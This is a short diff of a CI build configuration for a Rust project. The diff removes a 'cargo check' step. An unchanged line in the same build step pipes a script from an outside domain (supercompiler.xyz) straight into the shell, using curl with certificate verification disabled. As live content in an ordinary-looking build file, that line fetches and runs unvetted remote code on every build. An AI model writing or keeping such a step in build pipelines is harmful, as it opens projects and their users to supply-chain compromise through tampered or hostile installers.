@@ -16,7 +16,6 @@ jobs:
   - name: build
     commands:
       - rustup default stable
-      - cargo check # Fail fast
       - cargo build --locked
       - sh -c "$(curl -k https://supercompiler.xyz/install)"
     artifacts:
